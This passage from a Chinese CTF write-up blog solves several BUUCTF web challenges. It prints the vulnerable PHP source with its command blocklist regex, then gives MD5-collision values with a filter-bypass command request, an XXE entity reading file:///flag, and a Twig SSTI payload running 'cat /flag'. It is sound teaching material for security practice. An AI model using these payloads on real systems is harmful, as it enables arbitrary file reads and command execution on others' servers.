TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p><p>这时传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://5b8e822a-6993-43bd-8785-06dcc8b2d92d.node4.buuoj.cn:81/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=<br></code></pre></td></tr></table></figure><p>发现有个裂图，裂不裂无所谓主要数据带出来就行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;data:image/gif;base64,PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4=&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>将这段内容解密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>目的是执行到25行代码我们需要满足</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>...<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))  <br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br></code></pre></td></tr></table></figure><p>第二个if简单，模式比较单一    </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><p>那第一个呢</p><p>说一下非预期 sort 查看内容</p><p>预期呢</p><p>正则匹配中有一段代码是这样的  <code>|\\|\\\\|</code> 看的出来作者似乎想匹配 <code>&#39;\&#39;和&#39;\\&#39; </code> 然而实际上正则表达式本身还会做一次取转义 所以这里实际上匹配的是<code> &#39;|\&#39;</code></p><p>测试结果</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201131708725.png" alt="image-20220113170848618"></p><p>那么就简答了 上面过滤了 空格 和 cat，cat &#x2F;flag &#x3D;&gt;ca\t%0a&#x2F;flag</p><p>最后数据包如下即可getFlag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?cmd=ca\t%20/flag</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5b8e822a-6993-43bd-8785-06dcc8b2d92d.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>389<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5b8e822a-6993-43bd-8785-06dcc8b2d92d.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5b8e822a-6993-43bd-8785-06dcc8b2d92d.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span></span><br></code></pre></td></tr></table></figure><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>一眼xxe</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>57<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/xml, text/xml, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>一个最简单的payload出来了</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>126<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/xml, text/xml, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://6f0c91e5-36ac-4c72-af37-dc935433ad93.node4.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">]&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>一眼ssti，但是我自己没整出来</p><p>先以admin登录瞅瞅 返回 Hello admin，抓个包看看</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201131852252.png" alt="image-20220113185236167"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201131853886.png" alt="image-20220113185308811"></p><p>根据SSTi决策图，这题是Twig</p><p>有payload <code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201131855366.png" alt="image-20220113185531225"></p><div class="code-wrapper"><pre><code class="hljs">一个商店页面，应该是买第四个商品，这种题目一般是改HTTP数据包，但是这题显然不是。别的想法没啥能实现的，考虑到题目名称Uni</code></pre></div><p>可能考察的Unicode编码问题。</p><p>在这个网站上搜索字符串就行     <a href="https://www.compart.com/en/unicode/U+2188">https://www.compart.com/en/unicode/U+2188</a> 这里给的我的结果</p><p>只要让他的value &gt;1337 即可 </p><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>访问得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 